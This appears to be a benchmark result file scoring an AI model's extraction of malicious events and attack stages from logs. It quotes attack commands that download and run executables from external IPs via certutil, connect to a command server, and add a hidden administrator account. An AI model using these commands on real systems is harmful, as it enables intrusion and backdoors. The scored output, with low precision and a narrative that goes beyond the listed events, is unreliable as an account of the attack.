@@ -1,0 +1,92 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"taskkill /f /im agent.exe & certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe & cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "ywm.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \"cd /d \"D:/phpStudy/WWW\"&tasklist /svc | findstr TermService&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ whoami&arp -a&ipconfig&ping www.baidu.com -c 1'\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attack started with a phishing attempt using modified Chrome processes. It then downloaded and executed a payload via `certutil`, establishing persistent access with `agent.exe`. The attackers escalated privileges, collected system information, performed lateral movements through PowerShell commands, gathered sensitive data, and maintained control through backdoors.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26635,
+      "completion_tokens": 2921,
+      "total_tokens": 29556,
+      "wall_clock_s": 34.552,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.3,
+      "recall": 0.42857142857142855,
+      "f1": 0.3529411764705882,
+      "tp": 3,
+      "fp": 7,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.1,
+      "recall": 0.16666666666666666,
+      "f1": 0.125,
+      "tp": 1,
+      "fp": 9,
+      "fn": 5,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 26635,
+      "completion_tokens": 2921,
+      "total_tokens": 29556,
+      "wall_clock_s": 34.552,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
